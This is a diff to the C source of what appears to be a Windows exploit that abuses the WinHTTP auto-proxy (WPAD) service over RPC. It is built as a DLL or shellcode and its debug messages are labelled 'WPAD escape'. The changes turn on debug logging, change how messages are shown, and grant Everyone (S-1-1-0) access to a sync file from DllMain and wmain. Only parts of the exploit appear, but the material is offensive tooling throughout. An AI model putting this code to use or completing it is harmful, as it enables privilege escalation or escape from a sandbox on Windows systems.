@@ -1,9 +1,11 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <WtsApi32.h>
 #include "IWinHttpAutoProxySvc_h.h"
 
 #pragma comment(lib, "rpcrt4.lib")
+#pragma comment(lib, "Wtsapi32.lib")
 
 BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 
@@ -12,7 +14,7 @@ BOOL AddFileAcl(const wchar_t* FilePath, const wchar_t* SID);
 // Global settings
 ////////
 
-//#define DEBUG
+#define DEBUG
 //#define EXE_BUILD
 #define DLL_BUILD
 #define SHELLCODE_BUILD
@@ -38,8 +40,9 @@ void DebugLog(const wchar_t* Format, ...) {
     wvsprintfW(pBuffer, Format, Args);
     va_end(Args);
 #ifdef DLL_BUILD
-    uint32_t dwMsgAnswer = 0;
-    WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
+    MessageBoxW(NULL, pBuffer, L"WPAD escape", 0);
+    //uint32_t dwMsgAnswer = 0;
+    //WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, SESSION_ID, (wchar_t*)L"", 0, pBuffer, (wcslen(pBuffer) + 1) * 2, 0, 0, &dwMsgAnswer, TRUE);
 #endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", pBuffer);
@@ -202,6 +205,16 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
+    /*
+    static BOOL bRunOnce = FALSE;
+
+    if (!bRunOnce) {
+        bRunOnce = TRUE;
+    }
+    else {
+        Sleep(INFINITE); // Catch/trap multiple executions
+    }
+    */
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
 #ifdef SHELLCODE_BUILD
@@ -235,7 +248,9 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
 
                 if (hFile != INVALID_HANDLE_VALUE) {
                     CloseHandle(hFile);
-
+#ifdef DEBUG
+                    DebugLog(L"... setting Everyone ACL on %ws", SYNC_FILE);
+#endif
                     if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
 #ifdef DEBUG
                         DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
@@ -328,7 +343,7 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
             if (hFile != INVALID_HANDLE_VALUE) {
                 CloseHandle(hFile);
 
-                if (SetEveryoneFileAcl(SYNC_FILE)) {
+                if (AddFileAcl(SYNC_FILE, L"S-1-1-0")) {
                     DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
 
                     while (TRUE) {
